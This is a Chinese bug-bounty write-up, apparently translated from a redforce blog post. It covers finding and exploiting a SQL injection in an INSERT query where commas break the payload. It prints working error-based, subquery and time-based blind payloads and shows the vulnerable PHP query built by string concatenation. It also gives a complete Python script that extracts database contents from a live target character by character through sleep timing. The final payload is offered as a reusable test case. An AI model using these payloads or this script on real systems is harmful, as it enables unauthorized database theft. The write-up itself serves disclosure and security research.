***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

![一次INSERT查询的无逗号SQL注入漏洞构造利用](https://image.3001.net/images/20190406/1554546324_5ca87e94e2723.jpg!small)
**本文分享的是作者在一次众测中的SQL报错型注入漏洞发现过程，有趣之处在于，在后续漏洞利用的构造中，如果在目标服务端数据库逻辑的INSERT查询中使用逗号（Comma），将导致构造的Payload不可用，这种情况下，作者通过综合Time-based注入、Case When和Like操作成功实现了SQL注入，漏洞获得了厂商$10,000美金的奖励。**

## 漏洞介绍

INSERT查询或UPDATE型SQL注入漏洞也算是比较常见的了，在任何SQL注入漏洞中，原因都是由于不安全的用户输入传递给了后端数据查询。此次测试数据库中的用户输入逻辑大概可以这样描述：

    
    
    $email=$_POST['email'];
    $name=$_POST['name'];
    $review=$_POST['review'];
    $query="insert into reviews(review,email,name) values ('$review','$email','$name')";
    mysql_query($query,$conn);

依上所看，其对应的请求体应该是这样的：

    
    
    review=test review&email=info@example.com&name=test name

所以，经分析，可能存在以下的INSERT列插入语句：

    
    
    insert into reviews(review,email,name) values ('test review','info@example.com','test name')

最终，在目标数据库中形成的结果就是：  

    
    
    MariaDB [dummydb]> insert into reviews(review,email,name) values ('test review','info@example.com','test name');
    Query OK, 1 row affected (0.001 sec)
    MariaDB [dummydb]> select * from reviews;
    +-------------+------------------+-----------+
    | review      | email            | name      |
    +-------------+------------------+-----------+
    | test review | info@example.com | test name |
    +-------------+------------------+-----------+
    1 row in set (0.000 sec)

综上所述，在此，我们就有三种方法来对这个数据库逻辑进行漏洞注入构造。

### 用extractvalue方法构造的报错型注入

可以把上述分析中的review、email、name三个列插入值换成：

    
    
    test review' and extractvalue(0x0a,concat(0x0a,(select database()))) and '1

这种构造情况，会形成一个泄露目标数据库的SQL报错注入：

    
    
    MariaDB [dummydb]> insert into reviews(review,email,name) values ('test review' and extractvalue(0x0a,concat(0x0a,(select database()))) and '1','info@example.com','test name');
    ERROR 1105 (HY000): XPATH syntax error: '
    dummydb'

### 使用子查询 （Subquery）

基于以上报错型注入，我们可以进一步利用子查询
（Subquery）方式去读取数据库内容，并把它显示在插入列的内容中。例如，我们把review这个列的值构造为：

    
    
    jnk review',(select user()),'dummy name')-- -
那么，最后的插入查询语句会是：

    
    
    insert into reviews(review,email,name) values ('jnk review',(select user()),'dummy name')-- -,'info@example.com','test name');

仔细看，由于其中存在注释符 --，所以， **,'info@example.com','test name');** 就会被注释掉，而其中的(select
user())是对当前数据库用户的查询请求，一般会是 **root@localhost**
。所以，运行上述插入查询语句之后，数据库中review、email、name三列内容就会相应成为：jnk
review、root@localhost、dummy name，非常容易理解。如下：

    
    
    MariaDB [dummydb]> insert into reviews(review,email,name) values ('jnk review',(select user()),'dummy name');--,'info@example.com','test name');
    Query OK, 1 row affected (0.001 sec)
    MariaDB [dummydb]> select * from reviews;
    +-------------+------------------+------------+
    | review      | email            | name       |
    +-------------+------------------+------------+
    | test review | info@example.com | test name  |
    | jnk review  | root@localhost   | dummy name |
    +-------------+------------------+------------+
    2 rows in set (0.000 sec)
    MariaDB [dummydb]>

### Time-based的盲注构造

以上的构造Payload只能说明数据库内部的一个处理逻辑，但在应用端来看不能导致报错，而且也无法回显我们的插入语句结果，甚至是根本没法知道我们的插入语句是否是true
或false的情况，基于此，我们可以对它进行Time-based的盲注构造，结合 **If语句和substring方法** ，有以下Payload：

    
    
    xxx'-(IF((substring((select database()),1,1)) = 'd', sleep(5), 0))-'xxxx

如果查询语句为真，那么其后端数据库就会休眠5秒后才输出回显结果，用这种判断方式，我们可以来推断出数据库中的具体架构方式。具体方法可参考detectify实验室的
[sqli-in-insert-worse-than-select](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)。

## 综合分析

有了以上的分析，总体的漏洞利用应该不成问题了，但是，在我当前测试的目标数据库中，其存在注入漏洞的参数是 **urls[]** 和 **methods[]**
，而且它们的值都是用逗号
-“,”进行分隔的，我按照以上分析的Payload构造进行测试后发现，其中的逗号会破坏我们的Payload构造，最终会导致注入利用不成功。

以目标数据库的以下逻辑来说：

    
    
    $urls_input=$_POST['urls'];
    $urls = explode(",", $urls_input);
    print_r($urls);
    foreach($urls as $url){
      mysql_query("insert into xxxxxx (url,method) values ('$url','method')")
    }

如果我们按照之前分析的Payload构造进行测试，我们把其中的urls值替换为：

    
    
    xxx'-(IF((substring((select database()),1,1)) = 'd', sleep(5), 0))-'xxxx

那么由于逗号的存在，目标数据库后端的运行处理模式就会是：

    
    
    Array
    (
        [0] => xxx'-(IF((substring((select database())
        [1] => 1
        [2] => 1)) = 'd'
        [3] =>  sleep(5)
        [4] =>  0))-'xxxx
    )

所以，由于逗号的分隔作用，这样的处理也就无法形成我们的注入利用了。

## 解决方法

所以，这样来看，我们的Payload中必须不能包含逗号。第一步，我们需要找到一个代替IF条件且能用逗号和其它语句共同作用的方法语句。这里的话，选用
**case when** 比较适合，所以这里利用它的一个基本用法为：

    
    
    MariaDB [dummydb]> select CASE WHEN ((select substring('111',1,1)='1')) THEN (sleep(3)) ELSE 2 END;
    +--------------------------------------------------------------------------+
    | CASE WHEN ((select substring('111',1,1)='1')) THEN (sleep(3)) ELSE 2 END |
    +--------------------------------------------------------------------------+
    |                                                                        0 |
    +--------------------------------------------------------------------------+
    1 row in set (3.001 sec)

如果我们构造查询的语句为真，那么，数据库就会休眠3秒执行输出。

另外，我们还要找到代替substring的方法，那么，我们可以用 **Like操作** 来实现，比如以下逻辑：

    
    
    MariaDB [dummydb]> select CASE WHEN ((select database()) like 'd%') THEN (sleep(3)) ELSE 2 END;
    +----------------------------------------------------------------------+
    | CASE WHEN ((select database()) like 'd%') THEN (sleep(3)) ELSE 2 END |
    +----------------------------------------------------------------------+
    |                                                                    0 |
    +----------------------------------------------------------------------+
    1 row in set (3.001 sec)

其中的((select database()) like 'd%') 意思是，选取出的以 d
开头的模式字符串，如果这种模式匹配存在，数据库就会休眠3秒后输出。

所以，最后的综合就是把这个查询和INSERT连接在一起，出于测试保密原则，隐去目标主站，最终的Payload利用链接为：

    
    
    http://xxxxxxxx/'-(select CASE WHEN ((select database()) like 'd%') THEN (sleep(4)) ELSE 2 END)-'xxx

这种Payload利用中，可以把CASE WHEN和Like操作设置为对字符串（Char）的暴力破解，所以，最后成型的Payload是这样的：

 ****

    
    
     **urls[]=xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-'**

## 漏洞利用

对以上Payload进行手动测试会是一件非常耗时的事，所以，我编写了以下的Python脚本对它进行一个自动化利用：

    
    
    import requests
    import sys
    import time
    # xxxxxxxxxexample.com SQLi POC
    # Coded by Ahmed Sultan (0x4148)
    if len(sys.argv) == 1:
     print '''
    Usage : python sql.py "QUERY"
    Example : python sql.py "(select database)"
     '''
     sys.exit()
    query=sys.argv[1]
    print "[*] Obtaining length"
    url = "https://xxxxxxxxxexample.com:443/sub"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
    "Cookie": 'xxxxxxxxxxxxxxxxxxx',
    "Referer": "https://www.xxxxxxxxxexample.com:443/",
    "Host": "www.xxxxxxxxxexample.com",
    "Connection": "close",
    "X-Requested-With":"XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded"}
    for i in range(1,100):
     current_time=time.time()
     data={"methods[]": "on-site", "urls[]": "jnkfooo'-cast((select CASE WHEN ((select length("+query+"))="+str(i)+") THEN (sleep(1)) ELSE 2 END) as char)-'"}
     response=requests.post(url, headers=headers, data=data).text
     response_time=time.time()
     time_taken=response_time-current_time
     print "Executing jnkfooo'-cast((select CASE WHEN ((select length("+query+"))="+str(i)+") THEN (sleep(1)) ELSE 2 END) as char)-'"+" took "+str(time_taken)
     if time_taken > 2:
      print "[+] Length of DB query output is : "+str(i)
      length=i+1
      break
     i=i+1
    print "[*] obtaining query output\n"
    outp=''
    #Obtaining query output
    charset="abcdefghijklmnopqrstuvwxyz0123456789.ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-."
    for i in range(1,length):
     for char in charset:
      current_time=time.time()
      data={"methods[]": "on-site", "urls[]": "jnkfooo'-cast((select CASE WHEN ("+query+" like '"+outp+char+"%') THEN (sleep(1)) ELSE 2 END) as char)-'"}
      response=requests.post(url, headers=headers, data=data).text
      response_time=time.time()
      time_taken=response_time-current_time
      print "Executing jnkfooo'-cast((select CASE WHEN ("+query+" like '"+outp+char+"%') THEN (sleep(1)) ELSE 2 END) as char)-' took "+str(time_taken)
      if time_taken > 2:
       print "Got '"+char+"'"
       outp=outp+char
       break
     i=i+1
    print "QUERY output : "+outp

脚本利用示例：

    
    
    [19:38:36] root:/tmp # python sql7.py '(select "abc")'   
    [*] Obtaining length
    Executing jnkfooo'-cast((select CASE WHEN ((select length((select "abc")))=1) THEN (sleep(1)) ELSE 2 END) as char)-' took 0.538205862045
    Executing jnkfooo'-cast((select CASE WHEN ((select length((select "abc")))=2) THEN (sleep(1)) ELSE 2 END) as char)-' took 0.531971931458
    Executing jnkfooo'-cast((select CASE WHEN ((select length((select "abc")))=3) THEN (sleep(1)) ELSE 2 END) as char)-' took 5.55048894882
    [+] Length of DB query output is : 3
    [*] obtaining query output
    Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'a%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.5701880455
    Got 'a'
    Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'aa%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.635061979294
    Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'ab%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.61513400078
    Got 'b'
    Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'aba%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.565879821777
    Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'abb%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.553005933762
    Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'abc%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.6208281517
    Got 'c'
    QUERY output : abc

![sql11.png](https://image.3001.net/images/20190406/1554546019_5ca87d63b17dd.png!small)

最终，该漏洞获得目标测试厂商$10,000美金的奖励：

![bo4.png](https://image.3001.net/images/20190406/1554546109_5ca87dbd31b52.png!small)最终的那个SQL注入测试Payload，可以当成你注入测试时的一个用例：

 ****

    
    
     **xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-'**

 ***参考来源：[redforce](https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/)，clouds编译，转载请注明来自FreeBuf.COM**

